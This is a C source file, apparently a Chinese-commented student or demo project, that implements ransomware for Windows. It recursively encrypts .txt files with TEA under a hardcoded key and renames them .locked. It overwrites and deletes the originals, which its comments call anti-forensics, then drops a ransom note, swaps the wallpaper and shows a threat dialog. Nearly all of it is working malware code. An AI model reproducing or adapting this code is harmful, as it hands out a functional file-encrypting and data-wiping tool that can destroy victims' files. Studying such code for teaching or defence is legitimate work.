// ransomware_demo.c
#define _WIN32_WINNT 0x0601
#include <windows.h>  // Windows API 函式庫
#include <stdio.h>    // 標準輸入輸出函式庫
#include <stdlib.h>   // 標準函式庫，如 malloc、free
#include <string.h>   // 文字處理函式庫，如 strlen、strcmp
#include <stdint.h> 
#include <shellapi.h>
#include <dirent.h>   // 資料夾操作函式庫
#include <sys/stat.h>
#include "virus_utils.h"  // 自訂標頭檔，應該包含 is_infected 等自定義函式 

#define DEV_PASSWORD "12345"  // 定義開發者密碼
#define PATH_MAX_LEN 1024

void change_wallpaper(const char* image_path);

// TEA 金鑰 : 128 bit 由 4 個 32-bit 整數組成，為對稱加密，加解密使用同一把金鑰  
uint32_t key[4] = {0x24681010, 0x13579975, 0xABCDEF01, 0xFEDCBA10};

// TEA (Tiny Encryption Algorithm) 加密演算法 
// v 為要加密的 64-bit 明文 (2 個 uint32) 
// k 為 128-bit 金鑰  
void tea_encrypt(uint32_t* v, uint32_t* k) 
{
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;
    uint32_t delta = 0x9e3779b9; // 黃金比例常數，為分布均勻的二進位數字，讓每輪加密變化產生大量的進位  
    for (i = 0; i < 32; i++) {	// 執行 32 輪加密，輪數增加安全性越高  
        sum += delta; // 每輪讓 sum 加上 delta，作為非對稱性的的變量 
		// 運算有移位、異或、加法，來造成混淆  
        v0 += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);  
        v1 += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
    }
    // 加密後結果寫回原記憶體位址  
    v[0] = v0; 
	v[1] = v1;
}

// TEA (Tiny Encryption Algorithm) 解密演算法 
void tea_decrypt(uint32_t* v, uint32_t* k) 
{
    uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i;
    uint32_t delta = 0x9e3779b9;
    for (i = 0; i < 32; i++) {
        v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        sum -= delta; // 每輪遞減 sum  
    }
    v[0] = v0; 
	v[1] = v1;
}

// 組合路徑 (folder + PATH_SEP + name) 
// folder: 父資料夾的路徑; PATH_SEP: 路徑分隔符; name: 檔案或子資料夾的名稱;
// ex. folder: /home/user/data	當前正在掃描的資料夾。 PATH_SEP: / (假設在 Linux/Unix) 或 \ (假設在 Windows) 檔案系統的路徑分隔符。
// ex. name: my_file.txt readdir 讀取到的檔案名稱。 n: PATH_MAX_LEN	目標緩衝區 out 的大小。
static void join_path(char *out, size_t n, const char *folder, const char *name) {
    snprintf(out, n, "%s%s%s", folder, PATH_SEP, name);
}

// lock 單一檔案 (static 表該函式的作用域限定在當前原始碼檔案內)
static void lock_one_file(const char *folder, const char *name) {
    char oldpath[PATH_MAX_LEN];
    char newpath[PATH_MAX_LEN];
	 
    join_path(oldpath, sizeof(oldpath), folder, name);	// 組合 folder + name 得原始路徑存放到 oldpath 變數
 
    size_t len = strlen(name);    						// 取得原始檔案名稱的長度 

    // 計算檔案主名長度 : len > 4 確保最少為 5 個字元，也就是 1個字元 + .txt
    // name + (len - 4) 指標算術操作，將 name 指標向後移動 len - 4 個位置; x.txt(5個字元)，len - 4 = 1，新的指標 name + 1 也就是 .txt 中的 .
    // ? len - 4 : len 如為長度 > 4 且.txt結尾則移除 .txt 得到檔案主名長度 否則保留完整長度 
    size_t base_len = (len > 4 && strcmp(name + len - 4, ".txt") == 0) ? len - 4 : len;
    // 建立新檔案的完整路徑  %.*s 限制輸出的字串長度 從 name 中截取前 base_len 個字元作為檔案主名 
    snprintf(newpath, sizeof(newpath), "%s%s%.*s.locked", folder, PATH_SEP, (int)base_len, name); 

	// 以二進位模式開啟檔案 : "rb" 二進位讀取原檔、"wb" 二進位寫入加密後檔案  
	FILE *fin = fopen(oldpath, "rb");
	FILE *fout = fopen(newpath, "wb");
	
	if (!fin || !fout)
	{
		if (fin) fclose(fin);
		if (fout) fclose(fout);
		return;
	}
	
	uint32_t v[2];	// 每次讀取 8 bytes (2個 32-bit uint)
	size_t bytesread;
	
	// 逐塊加密，使用 fread 從原檔讀取 8 bytes = 1 block  
	while ((bytesread = fread(v, 1, 8, fin)) > 0)
	{
		// 填充處理 - ZeroBytePadding，當檔案末尾不滿 8 bytes， 剩餘補 0 填充滿　
		//　因 TEA 為分組加密，強制要求輸入必須為 8 bytes的倍數  
		if (bytesread < 8)
		{
			memset((char*)v + bytesread, 0, 8 - bytesread);
		}
		tea_encrypt(v, key); // 呼叫 TEA 進行 32 輪攪亂 
		fwrite(v, sizeof(uint32_t), 2, fout); // 將加密後的 8 bytes 寫入新檔案 
	}
	
	fclose(fin);
	fclose(fout);
	
	// 多重防禦規避  Anti-Forensics  
	// 在刪除原檔前，先用亂數覆蓋原檔，防止檔案救援軟體找回 
	FILE *fwipe = fopen(oldpath, "rb+");
	if (fwipe)
	{
		fseek(fwipe, 0, SEEK_END);
		long fsize = ftell(fwipe);
		if (fsize > 0)
		{
			rewind(fwipe);
			for (long i = 0; i< fsize; i++)
			{
				fputc(rand() % 256, fwipe); // 填充隨機亂數 
			}
			fflush(fwipe); // 強制將緩衝區內容寫入物理磁碟 
		}
		fclose(fwipe);
	}
	
	// 確保檔案不是隱藏或唯讀狀態，否則 remove 可能會失敗 
	SetFileAttributes(oldpath, FILE_ATTRIBUTE_NORMAL);
	
	/*printf("\n[!!! 截圖中斷點 !!!]\n");
	printf("檔案 %s 已完成隨機數據覆寫 (Wiping)。\n", name);
	printf("此時檔案尚未刪除，請立即使用 HxD 開啟該檔案進行截圖！\n");
	system("pause"); // 讓程式停在這裡，不要執行下方的 remove*/
	
	// 執行刪除並檢查返回值，現在刪除的是已經被抹除過的檔案 
	if (remove(oldpath) == 0)
	{
		printf("[抹除] 原始檔案已亂數覆寫且被刪除: %s\n", name);
	}
	else
	{
		perror("警告 : 無法刪除原檔");
	}
	
}

// unlock 單一檔案 
static void unlock_one_file(const char *folder, const char *name) {
    char oldpath[PATH_MAX_LEN];
    char newpath[PATH_MAX_LEN];

    join_path(oldpath, sizeof(oldpath), folder, name);

    // 將 ".locked" 改回 ".txt"
    size_t len = strlen(name);
    size_t base_len = (len > 7 && strcmp(name + len - 7, ".locked") == 0) ? len - 7 : len;
    snprintf(newpath, sizeof(newpath), "%s%s%.*s.txt", folder, PATH_SEP, (int)base_len, name);

    FILE *fin = fopen(oldpath, "rb");
    FILE *fout = fopen(newpath, "wb");
    
    if (!fin || !fout)
    {
    	if (fin) fclose(fin);
    	if (fout) fclose(fout);
    	return;
	}
	
	uint32_t v[2];
	while (fread(v, sizeof(uint32_t), 2, fin) == 2)
	{
		tea_decrypt(v, key); // 逆向 32 輪運算還原數據 
		fwrite(v, sizeof(uint32_t), 2, fout); // 將還原後的明文寫回 .txt 檔 
	}
	
	fclose(fin);
	fclose(fout);
	
	// 清理：還原成功後，刪除原本加密的 .locked 檔案  
	remove(oldpath);
	printf("檔案已還原 : %s\n", newpath);
}

// 遞迴掃描並 lock 
void lock_files_recursive(const char *folder) {
    DIR *dir = opendir(folder);
    if (!dir) {
        // 無法開啟資料夾，直接返回
        // perror(folder); // 若要更詳細錯誤可以解除註解
        return;
    }

    struct dirent *entry; // 儲存目錄中每個檔案或資料夾的資訊 (ex.名稱)
    struct stat st; // 儲存檔案、資料夾的詳細狀態資訊 (ex.權限、大小)
    char path[PATH_MAX_LEN]; // 儲存完整路徑  

	// 迴圈開始 遍歷目錄裡所有檔案 
    while ((entry = readdir(dir)) != NULL) {
        // 忽略 .(當前資料夾) 與 ..(上層資料夾) 如果是直接跳過迴圈 忽略這兩個特殊條目 
        // opendir/readdir 總是會回傳 . (當前目錄) 和 .. (上層目錄) 兩個特殊的目錄條目
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

		// 呼叫函數 將當前資料夾路徑(folder)和條目名稱 (entry->d_name) 連接起來
        join_path(path, sizeof(path), folder, entry->d_name);

        if (stat(path, &st) != 0) continue; // 嘗試獲取 path 所指物件的狀態，並將資訊寫入 st 結構

        if (S_ISDIR(st.st_mode)) { // 檢查 st 結構中的模式 (st.st_mode)，判斷它是否是一個資料夾
            // 資料夾 -> 遞迴呼叫 並傳入該資料夾的完整路徑
            lock_files_recursive(path);
        } else {
            // 檔案：只處理 .txt 且不包含 .locked
            if (strstr(entry->d_name, ".txt") != NULL && strstr(entry->d_name, ".locked") == NULL) {
                lock_one_file(folder, entry->d_name);
            }
        }
    }

    closedir(dir);
}

// 遞迴掃描並 unlock 
void unlock_files_recursive(const char *folder) {
    DIR *dir = opendir(folder);
    if (!dir) return;

    struct dirent *entry;
    struct stat st;
    char path[PATH_MAX_LEN];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        join_path(path, sizeof(path), folder, entry->d_name);

        if (stat(path, &st) != 0) continue;

        if (S_ISDIR(st.st_mode)) {
            unlock_files_recursive(path);
        } else {
            // 處理 .locked 檔案
            if (strstr(entry->d_name, ".locked") != NULL) {
                unlock_one_file(folder, entry->d_name);
            }
        }
    }

    closedir(dir);
}

// 建立/刪除 README 檔案 (只在 root folder 建立/刪除) 
static void create_ransom_readme(const char *folder) {
    char ransom_path[PATH_MAX_LEN];
    join_path(ransom_path, sizeof(ransom_path), folder, "README_TO_RECOVER.txt"); // 將folder 路徑和固定檔名傳入函數組合起來 存進 ransom_path 
    FILE *fp = fopen(ransom_path, "w"); // w: 寫入模式  
    if (fp) {
		fprintf(fp, "========================================================\n");
        fprintf(fp, "[ !!! WARNING: YOUR FILES ARE ENCRYPTED !!! ]\n");
        fprintf(fp, "========================================================\n\n");
        fprintf(fp, "All your important documents have been encrypted using the TEA algorithm.\n");
        fprintf(fp, "To recover your data, you need the unique Decryption Key.\n\n");
        fprintf(fp, "1. DO NOT try to change the file extension.\n");
        fprintf(fp, "2. DO NOT try to use third-party software to recover.\n");
        fprintf(fp, "3. Enter the correct key in the simulator to restore your files.\n\n");
        fprintf(fp, "--------------------------------------------------------\n");
        fprintf(fp, "[ Contact Developer for the Key ]\n");
        fprintf(fp, "========================================================\n");
        fclose(fp);
    }
}

static void remove_ransom_readme(const char *folder) {
    char ransom_path[PATH_MAX_LEN];
    join_path(ransom_path, sizeof(ransom_path), folder, "README_TO_RECOVER.txt");
    remove(ransom_path);
}

// 原本的 lock_files() 與 unlock_files() 改為呼叫遞迴版 
void lock_files() {
	printf("\n[加密中]開始遞迴掃描並使用 TEA 演算法加密檔案...\n");
    lock_files_recursive(TARGET_FOLDER);
    
    // 在 root folder 建立 README
    create_ransom_readme(TARGET_FOLDER);
    
    char ransom_note_path[PATH_MAX_LEN];
    join_path(ransom_note_path, sizeof(ransom_note_path), TARGET_FOLDER, "README_TO_RECOVER.txt");
    
    // 處理桌布路徑並「執行」換桌布 
	char absolute_image_path[PATH_MAX_LEN];
	if (_fullpath(absolute_image_path, "warn.png", PATH_MAX_LEN) != NULL)
	{
		printf("[已觸發]正在更換勒索桌布: %s\n",absolute_image_path);
		change_wallpaper(absolute_image_path);
	}
	else
	{
		printf("[錯誤] 無法取得圖片路徑\n");
	}
    
    // 彈出警告視窗 
	MessageBox(NULL,
				"警告:偵測到未知加密動作!\n 您重要的所有文件已被鎖定。\n 請點擊 README 檔案文件以獲取解密金鑰。",
				"嚴重系統安全性威脅",
				MB_OK | MB_ICONERROR | MB_SETFOREGROUND);
	
	// 自動開啟勒索信 
	ShellExecute(NULL, "open", ransom_note_path, NULL, NULL, SW_SHOWNORMAL);
    
    printf("[完成] 所有檔案已完成加密，並彈出勒索警告。\n");
}

void unlock_files() {
    printf("\n[還原中] 開始遞迴掃描並還原加密檔案...\n");
    unlock_files_recursive(TARGET_FOLDER);
    // 刪除 root folder 上的 README
    remove_ransom_readme(TARGET_FOLDER);
    printf("[完成] 檔案已解密還原。\n");
}

void change_wallpaper(const char* image_path)
{
	// SPI_SETDESKWALLPAPER : 修改桌布的指令 
	// SPIF_UPDATEINIFILE : 將更改寫入註冊表，使其永久生效 
	// SPIF_SENDCHANGE : 通知所有視窗桌布已更改 
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE); 
}


// 主控制流程，模擬勒索軟體操作
void run_ransomware_demo() {
    int choice;  											// 使用者選項 
    char password[32];  									// 儲存使用者輸入的密碼 
    int attempts = 0;   									// 嘗試次數 
    int success = 0;  										// 密碼驗證結果 

    printf("\n勒索軟體加密模組:\n");
    printf("1. 執行加密\n");
    printf("2. 執行解密\n");
    printf("請輸入選項 : ");
    if(scanf("%d", &choice) != 1)
	{
		while (getchar() != '\n');
		printf("輸入錯誤\n");
		return;
	}  									
    getchar();  											// 吃掉多餘換行符號，避免影響之後輸入

    while (attempts < 3) 									// 最多嘗試三次輸入密碼 
	{  	
		printf("請輸入密碼 (最多三次): ");						
        if(!fgets(password, sizeof(password), stdin)) break;// 讀取密碼輸入 
        password[strcspn(password, "\n")] = '\0';  			// 移除換行符號 

        if (strcmp(password, DEV_PASSWORD) == 0) {  		// 比對密碼是否正確 
            success = 1;
            break;
        } else {
            printf("密碼錯誤！剩餘次數：%d\n", 2 - attempts);
            attempts++;
        }
    }

    if (!success) {  										// 若三次都失敗，拒絕操作 
        printf("密碼錯誤超過次數，系統鎖定操作。\n");
        return;
    }

    printf("密碼正確，開始操作...\n");

    switch (choice) {  										// 根據選項執行動作 
        case 1:
            lock_files();  									// 選擇鎖定 
            break;
        case 2:
            unlock_files();  								// 選擇還原 
            break;
        default:
            printf("無效選項。\n");
            break;
    }
}

